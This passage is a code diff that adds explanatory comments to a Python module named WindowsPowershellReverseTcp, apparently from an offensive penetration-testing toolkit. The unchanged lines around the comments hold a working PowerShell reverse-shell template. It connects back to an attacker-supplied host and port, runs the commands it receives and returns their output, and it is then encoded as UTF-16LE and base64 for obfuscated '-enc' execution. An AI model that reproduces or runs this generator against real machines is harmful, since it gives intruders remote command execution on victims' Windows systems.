@@ -13,6 +13,7 @@ class WindowsPowershellReverseTcp(BaseModule):
 
     @staticmethod
     def add_arguments(parser):
+        # Add required host and port arguments to the parser
         parser.add_argument(
             "--host", required=True, help="Attacker IP address to connect back to"
         )
@@ -22,6 +23,7 @@ class WindowsPowershellReverseTcp(BaseModule):
 
     @staticmethod
     def main(args):
+        # Log target host and port information
         Logger.log("info", f"HOST {args.host}")
         Logger.log("info", f"PORT {args.port}")
         print()
@@ -29,6 +31,7 @@ class WindowsPowershellReverseTcp(BaseModule):
         host = args.host
         port = args.port
 
+        # PowerShell reverse shell script template with target host and port
         script_template = f"""$t=New-Object Net.Sockets.TcpClient('{host}',{port})
 $s=$t.GetStream()
 $w=New-Object IO.StreamWriter($s)
@@ -39,6 +42,7 @@ while(1){{
     $w.WriteLine($o+"`n"+(pwd).Path+"> ");$w.Flush()
 }}"""
 
+        # Encode script in UTF-16LE and then base64 encode for PowerShell -enc usage
         bytes = script_template.encode("utf-16-le")
         Logger.log("good", f"Size ({len(bytes)} bytes)")
         Logger.log(
